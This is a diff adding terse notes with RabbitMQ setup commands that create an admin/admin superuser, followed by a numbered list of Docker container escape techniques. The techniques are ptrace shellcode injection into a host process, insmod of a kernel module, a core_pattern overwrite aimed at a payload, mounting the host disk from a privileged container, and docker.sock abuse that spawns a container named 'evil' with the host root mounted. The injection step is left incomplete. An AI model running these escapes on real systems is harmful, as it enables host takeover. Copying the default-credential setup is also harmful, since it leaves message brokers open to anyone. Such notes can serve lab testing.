@@ -1,0 +1,44 @@
+rabbitmq:
+sudo apt update
+sudo apt install rabbitmq-server -y
+sudo systemctl enable rabbitmq-server
+sudo systemctl start rabbitmq-server
+sudo rabbitmqctl add_user admin admin
+sudo rabbitmqctl set_permissions -p / admin ".*" ".*" ".*"
+sudo rabbitmqctl set_user_tags admin administrator
+sudo rabbitmq-plugins enable rabbitmq_management
+sudo systemctl restart rabbitmq-server
+
+
+tests:
+(1) CAP_SYS_PTRACE
+    sudo docker run -it --cap-add CAP_SYS_PTRACE --pid=host --security-opt=apparmor:unconfined ubuntu:latest
+    apt update && apt install gdb -y
+    gdb -p <pid: ps aux | grep cron>
+    set {long}($rip+0) = 0x296afc93f9fc91f9
+    set {long}($rip+8) = 
+(2) CAP_SYS_MODULE
+    sudo docker run -it --cap-add=SYS_MODULE -v "$(pwd)/hello.ko:/hello.ko" ubuntu:latest
+    apt update && apt install kmod -y
+    cp hello.ko root/
+    cd root
+    insmod hello.ko
+(3) sudo docker run -it ubuntu
+    mknod /dev/sda b 8 0
+(4) CAP_SYS_ADMIN
+    sudo docker run -it -v /proc:/host/proc ubuntu:latest
+    path=`sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab`
+    echo "|$path/payload" > /host/proc/sys/kernel/core_pattern
+    -----
+    sudo docker run -it -v /sys:/host/sys ubuntu:latest
+    path=`sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab`
+    echo "|$path/payload" > /host/sys/kernel/core_pattern
+(5) PRIVILEGED
+    sudo docker run -it --privileged ubuntu:latest
+    mount /dev/sda3 /mnt
+(6) DOCKER.SOCK
+    sudo docker run -it -v /run/docker.sock:/run/docker.sock ubuntu:latest
+    apt update && apt install curl -y
+    curl --silent -XPOST --unix-socket /run/docker.sock -d '{"Image":"ubuntu:latest","HostConfig":{"Binds":["/:/host"]}}' -H 'Content-Type: application/json' http://localhost/containers/create?name=evil
+    curl --silent -XPOST --unix-socket /run/docker.sock -d '{"Image":"ubuntu:latest","Privileged":true}' -H 'Content-Type: application/json' http://localhost/containers/create?name=evil
+    docker run -it --privileged ubuntu
